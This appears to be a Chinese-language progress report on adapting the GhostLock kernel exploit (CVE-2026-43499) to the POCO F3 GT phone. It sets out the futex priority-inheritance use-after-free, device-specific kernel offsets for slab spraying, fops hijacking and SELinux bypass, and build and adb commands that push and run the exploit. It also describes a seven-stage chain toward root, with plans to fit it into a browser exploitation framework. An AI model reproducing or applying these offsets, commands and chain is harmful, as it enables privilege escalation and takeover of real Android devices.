# GhostLock (CVE-2026-43499) — POCO F3 GT (aresin) 适配进度

> **设备**: POCO F3 GT / Redmi K40 Gaming Edition (codename: aresin)
> **芯片**: MediaTek Dimensity 1200 (MT6893)
> **系统**: Android 13 / MIUI V14.0.4.0.TKJCNXM
> **内核**: 4.14.186-g0dc1d312efb3
> **日期**: 2026-07-27

---

## 漏洞触发验证

✅ **已在真机上可靠复现 GhostLock 漏洞**

每次运行 exploit 都会触发 kernel panic，崩溃栈一致：

```
Call trace:
  _raw_spin_trylock+0x1c/0x70
  rt_mutex_adjust_prio_chain+0x104/0x68c    ← PI 链式遍历触发 UAF
  rt_mutex_adjust_pi+0x9c/0xac
  __sched_setscheduler+0xca0/0xe24
  SyS_sched_setattr+0x3e0/0x508
  el0_svc_naked+0x34/0x38
```

根因：`remove_waiter()` 错误清理 `current->pi_blocked_on` 而非 `waiter->task->pi_blocked_on`，导致悬空指针。

---

## 偏移提取结果

### 已提取的偏移（从 vmlinux 固件分析）

| 符号 | 偏移 (from _stext) | 提取方法 | 用途 |
|------|-------------------|----------|------|
| `KMALLOC_CACHES` | `0x1783828` | ADRP 分析 `__kmalloc` | slab 堆喷控制 |
| `ASHMEM_MISC_FOPS` | `0x1da5d98` | ADRP 分析 `ashmem_mmap` | fops 劫持 |
| `SECURITY_HOOK_HEADS` | `0x15f5f70` | ADRP 分析 `security_inode_create` | LSM hook 覆盖 |
| `SELINUX_BLOB_SIZES` | `0x2080308` | ADRP 分析 `selinux_cred_prepare` | SELinux 绕过 |

### 运行时解析的符号（从 /proc/kallsyms）

| 符号 | 解析方法 | 用途 |
|------|----------|------|
| `pipe_buf_ops` | kallsyms → `generic_pipe_buf_confirm` | pipe buffer 识别 |
| `noop_llseek` | kallsyms | fops 表填充 |

### 固定偏移（从 target.h）

| 符号 | 偏移 | 来源 |
|------|------|------|
| `INIT_TASK` | `0x01c5c058` | /proc/kallsyms |
| `INIT_CRED` | `0x01e63850` | /proc/kallsyms |
| `SELINUX_ENFORCING` | `0x02120b28` | /proc/kallsyms |
| `ROOT_TASK_GROUP` | `0x01c6e1f0` | /proc/kallsyms |

---

## 编译构建

### 环境要求

- Android NDK r25+ (aarch64-linux-android28-clang)
- Windows / Linux

### 编译命令

```bash
# Standalone 版本
aarch64-linux-android28-clang \
  -O2 -Isrc -include src/targets/aresin/target.h \
  -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function \
  src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c src/standalone.c \
  -o build/aresin/bin/ghostlock_standalone -pthread

# Preload .so 版本
make preload
```

### 构建产物

```
build/aresin/bin/ghostlock_standalone  (90KB, aarch64 ELF)
build/aresin/bin/preload.so            (131KB, 共享库)
build/embed/su_daemon_aarch64_pie      (14KB, su 守护进程)
```

---

## 真机测试

### 测试步骤

```bash
# 1. 推送文件
base64 build/aresin/bin/ghostlock_standalone | \
  adb shell "su -c 'base64 -d > /data/local/tmp/ghostlock && chmod 755 /data/local/tmp/ghostlock'"

# 2. 设置 kptr_restrict
adb shell "su -c 'echo 0 > /proc/sys/kernel/kptr_restrict'"

# 3. 运行
adb shell "su -c '/data/local/tmp/ghostlock'"
```

### 预期行为

| 阶段 | 输出 | 说明 |
|------|------|------|
| 初始化 | `startup context pid=xxx uid=0` | 设备识别正确 |
| 偏移解析 | `pipe_buf_ops: resolved 0x...` | kallsyms 解析成功 |
| 漏洞触发 | kernel panic → 设备重启 | **预期行为** |

### 测试结果

- ✅ 漏洞触发：每次运行都成功触发 kernel panic
- ✅ 偏移解析：pipe_buf_ops 和 noop_llseek 从 kallsyms 解析
- ✅ 编译构建：零错误零警告
- ⚠️ 完整 LPE：需要进一步调试 pipe 物理读写原语

---

## 技术细节

### 漏洞机制

1. 构建 3-futex PI 环（`f_pi_chain` ↔ `f_pi_target`，`f_wait` 作为 requeue 源）
2. 调用 `FUTEX_CMP_REQUEUE_PI` 触发 `-EDEADLK`
3. `remove_waiter()` 错误清理 `current->pi_blocked_on`
4. `waiter->task->pi_blocked_on` 悬空指向已释放的栈帧
5. `sched_setattr` 触发 PI 链式遍历 → 访问悬空指针 → kernel panic

### 利用链（上游公开版）

| 阶段 | 名称 | 状态 |
|------|------|------|
| 1 | ASLR 泄漏 (prefetch 侧信道) | ✅ 已实现 |
| 2 | GhostLock 触发 | ✅ 已验证 |
| 3 | Stack-UAF Reclaim (PR_SET_MM_MAP) | ✅ 已实现 |
| 4 | 任意地址写入器 | ✅ 已实现 |
| 5 | CEA Spray | ✅ 已实现 |
| 6 | 控制流劫持 (CFH) | ✅ 已实现 |
| 7 | DirtyMode | ✅ 已实现 |

### 4.14 内核适配要点

| 项目 | 6.x 内核 | 4.14 内核 |
|------|----------|----------|
| `rt_mutex_waiter` | rb_node | rb_node (相同) |
| `futex_hashsize` | `nproc * 256` | `256` (全局哈希表) |
| `KERNELSNITCH_THRESHOLD_MULT` | 10 | 3 |
| `PSELECT_WAITER_WORD_SHIFT` | 1 | 2 |
| `CONFIG_KALLSYMS_BASE_RELATIVE` | 是 | 否 |

---

## 文件结构

```
ghostlock-aresin/
├── README.md              # 项目说明
├── PROGRESS.md            # 本文件 - 进度报告
├── EXTRACTED_OFFSETS.md   # 偏移提取详细报告
├── Makefile               # 编译脚本
├── target.h               # 根目录偏移定义（参考）
├── src/
│   ├── targets/aresin/
│   │   └── target.h       # 编译使用的偏移定义
│   ├── main.c             # 主利用逻辑
│   ├── util.c             # 工具函数 + 运行时偏移解析
│   ├── slide.c            # KASLR 泄漏
│   ├── fops.c             # 文件操作原语
│   ├── pipe.c             # pipe 物理读写
│   ├── root.c             # 提权
│   ├── preload.c          # LD_PRELOAD 入口
│   ├── standalone.c       # 独立运行入口
│   ├── common.h           # 公共定义
│   └── kernelsnitch/      # 内核结构体泄漏
├── tools/
│   ├── extract_missing_offsets.sh    # 偏移提取脚本
│   ├── fill_offsets.c                # 运行时偏移查找
│   └── find_syms_via_disasm.c        # 反汇编查找符号
├── boot/
│   ├── boot.img           # 设备 boot 镜像
│   └── kernel_raw         # 解压后的内核
├── firmware/
│   └── vmlinux            # 从固件包提取的内核
└── build/
    └── aresin/bin/
        ├── ghostlock_standalone  # 编译产物
        └── preload.so            # 共享库版本
```

---

## 下一步

1. **调试 pipe 物理读写原语** — 确认 pipe buffer 识别和 slab cache 匹配正确
2. **测试完整 LPE 链** — 从漏洞触发到 root 提权
3. **编译 .so 版本** — 适配 Rootme 浏览器利用框架
4. **优化稳定性** — 提高 exploit 成功率

---

## 参考资料

| 资源 | 链接 |
|------|------|
| 原始研究 | https://nebusec.ai/research/ionstack-part-2/ |
| PoC 仓库 | https://github.com/NebuSec/CyberMeowfia |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-43499 |
| 固件包 | ares_images_V14.0.4.0.TKJCNXM_20230710 |
